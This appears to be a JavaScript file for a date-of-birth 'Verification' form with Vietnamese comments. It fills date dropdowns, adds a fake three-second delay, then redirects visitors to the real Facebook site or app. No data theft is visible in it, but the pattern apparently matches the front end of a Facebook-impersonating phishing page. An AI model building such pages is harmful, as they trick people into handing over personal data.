
function validate() {
    var ngay = document.getElementById("day").value;
    var thang = document.getElementById("month").value;
    var nam = document.getElementById("year").value;

    if (ngay && thang && nam) {
        ngay = parseInt(ngay);
        thang = parseInt(thang);
        nam = parseInt(nam);

        if (thang === 2) {
            if ((nam % 4 === 0 && nam % 100 !== 0) || (nam % 400 === 0)) {
                if (ngay > 29) {
                    ngay = 29;
                    document.getElementById("day").value = "29";
                }
            } else {
                if (ngay > 28) {
                    ngay = 28;
                    document.getElementById("day").value = "28";
                }
            }
        }

        if ([4, 6, 9, 11].includes(thang) && ngay > 30) {
            ngay = 30;
            document.getElementById("day").value = "30";
        }
    }
}

function seleDay() {
    var ngaySelect = document.getElementById("day");
    for (var i = 1; i <= 31; i++) {
        var option = document.createElement("option");
        option.text = i < 10 ? "0" + i : "" + i;
        option.value = i < 10 ? "0" + i : "" + i;
        ngaySelect.add(option);
    }
}


function seleMonth() {
    var thangSelect = document.getElementById("month");
    for (var i = 1; i <= 12; i++) {
        var option = document.createElement("option");
        option.text = i < 10 ? "0" + i : "" + i;
        option.value = i < 10 ? "0" + i : "" + i;
        thangSelect.add(option);
    }
}

function seleYear() {
    var namSelect = document.getElementById("year");
    var namHienTai = new Date().getFullYear();
    for (var i = namHienTai; i >= namHienTai - 100; i--) {
        var option = document.createElement("option");
        option.text = i;
        option.value = i;
        namSelect.add(option);
    }
}

// Gọi các hàm để tạo dropdowns
seleDay();
seleMonth();
seleYear();

function setError(msg) {
    document.getElementById("error").innerText = msg;
    document.getElementById("err").style.display =  "none";
    setTimeout(function () {
        document.getElementById("error").innerText = "";
    }, 2000);
}
function validateForm() {
    var ngay = document.getElementById("day").value.trim();
    var thang = document.getElementById("month").value.trim();
    var nam = document.getElementById("year").value.trim();
    if (ngay === "" || thang === "" || nam === "") {
        setError("Please fill in the date of birth.");
        return false;
    }
    var button = document.getElementById("submit");
    button.innerHTML = "• • •";
    button.disabled = true;

    setTimeout(function () {
        button.innerHTML = "Verification";
        return true;
        }, 3000);
}

function openFacebookLink() {
    var check = document.getElementById("myHiddenVar").value.trim();
    if (check === null || check === "") {
        return;
    }
    var userAgent = navigator.userAgent.toLowerCase();

    // Kiểm tra xem người dùng sử dụng thiết bị di động
    if (userAgent.includes('android') || userAgent.includes('iphone')) {
        // Nếu đang ở điện thoại, mở ứng dụng Facebook (nếu có)
        window.location.href = 'fb://profile/'; // Thay "your_facebook_username" bằng tên người dùng Facebook của bạn
    } else {
        // Nếu đang ở máy tính hoặc trình duyệt không hỗ trợ URI Scheme, mở trang web Facebook
        window.location.href = 'https://www.facebook.com/';
    }
}
openFacebookLink();